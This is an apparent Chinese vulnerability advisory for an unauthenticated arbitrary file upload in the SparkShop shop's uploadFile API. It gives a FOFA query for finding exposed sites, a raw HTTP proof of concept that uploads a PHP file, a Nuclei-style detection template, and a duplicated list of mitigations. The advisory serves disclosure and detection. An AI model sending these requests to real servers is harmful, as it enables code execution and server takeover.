# SparkShop开源商城 uploadFile 任意文件上传漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | SparkShop开源商城 uploadFile 任意文件上传漏洞 |
| 漏洞类型 | 任意文件上传 |
| 影响组件 | SparkShop开源商城 |
| 影响版本 | SparkShop开源商城 |
| 严重程度 | 高危 |

## 漏洞概述

SparkShop开源商城 uploadFile 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## 测绘语法

详见 `../../vulns/fofa-cache.md`

``` "SparkShop" ```

## 漏洞复现

### POC

```
POST /api/Common/uploadFile HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7Ol0PiiukkdktZR

------WebKitFormBoundaryj7Ol0PiiukkdktZR
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/plain

<?php echo "hello world";?>
------WebKitFormBoundaryj7Ol0PiiukkdktZR--
```

#

 模板

```yaml
id: sparkshop-uploadfile
info:
  name: SparkShop uploadFile 任意文件上传
  severity: high
  tags: sparkshop,file-upload,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/Common/uploadFile"
    body: |
      ------WebKitFormBoundaryj7Ol0PiiukkdktZR
      Content-Disposition: form-data; name="file"; filename="test.php"
      Content-Type: text/plain

      <?php echo "test"; ?>
      ------WebKitFormBoundaryj7Ol0PiiukkdktZR--
    matchers:
      - type: word
        words:
          - ".php"
          - "uploads"
          - "filename"
        part: body
```

## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限

## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限